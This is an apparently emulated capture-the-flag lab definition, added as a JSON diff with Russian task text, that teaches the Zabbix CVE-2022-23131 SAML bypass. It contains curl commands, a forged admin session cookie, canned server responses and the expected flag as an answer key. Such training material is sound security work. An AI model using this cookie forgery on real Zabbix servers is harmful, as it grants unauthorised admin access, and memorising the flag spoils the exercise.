@@ -1,0 +1,42 @@
+{
+  "id": "web-zabbix",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{z4bb1x_s4ml_byp4ss_zbx_s3ss10n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Zabbix CVE-2022-23131 (обход SAML)\n\nЦель: `http://zabbix.local:8080`.\n\n1. Версия (открытый метод):\n   curl -s -H 'Content-Type: application/json' -d '{\"jsonrpc\":\"2.0\",\"method\":\"apiinfo.version\",\"params\":{},\"id\":1}' http://zabbix.local:8080/api_jsonrpc.php\n\n2. Cookie сессии не проверяется по подписи. Подделанная cookie (base64 JSON):\n   zbx_session=eyJzZXNzaW9uaWQiOiAiMDAwMDAwMDAwMDAwMDAwMCIsICJzaWduIjogImZvcmdlZCIsICJzYW1sX2RhdGEiOiB7InVzZXJuYW1lX2F0dHJpYnV0ZSI6ICJBZG1pbiJ9fQ==\n\n3. Отправь запрос с подделанной cookie:\n   curl -s 'http://zabbix.local:8080/zabbix.php?action=dashboard.view' -H 'Cookie: zbx_session=eyJzZXNzaW9uaWQiOiAiMDAwMDAwMDAwMDAwMDAwMCIsICJzaWduIjogImZvcmdlZCIsICJzYW1sX2RhdGEiOiB7InVzZXJuYW1lX2F0dHJpYnV0ZSI6ICJBZG1pbiJ9fQ=='\n\n4. В ответе — флаг. Сохрани в found.txt и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция zabbix.local)",
+      "cases": [
+        {
+          "match": "zbx_session|dashboard",
+          "example": "-s 'http://zabbix.local:8080/zabbix.php?action=dashboard.view' -H 'Cookie: zbx_session=...'",
+          "output": "<html><body>Zabbix Dashboard (Admin)\nnto{z4bb1x_s4ml_byp4ss_zbx_s3ss10n}\n</body></html>\n"
+        },
+        {
+          "match": "apiinfo\\.version",
+          "example": "-s -H 'Content-Type: application/json' -d '{...apiinfo.version...}' http://zabbix.local:8080/api_jsonrpc.php",
+          "output": "{\"jsonrpc\":\"2.0\",\"result\":\"5.4.0\",\"id\":1}\n"
+        },
+        {
+          "match": "user\\.login",
+          "example": "-s -d '{...user.login Admin/zabbix...}' http://zabbix.local:8080/api_jsonrpc.php",
+          "output": "{\"jsonrpc\":\"2.0\",\"result\":\"<session-token>\",\"id\":1}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только zabbix.local"
+    }
+  }
+}
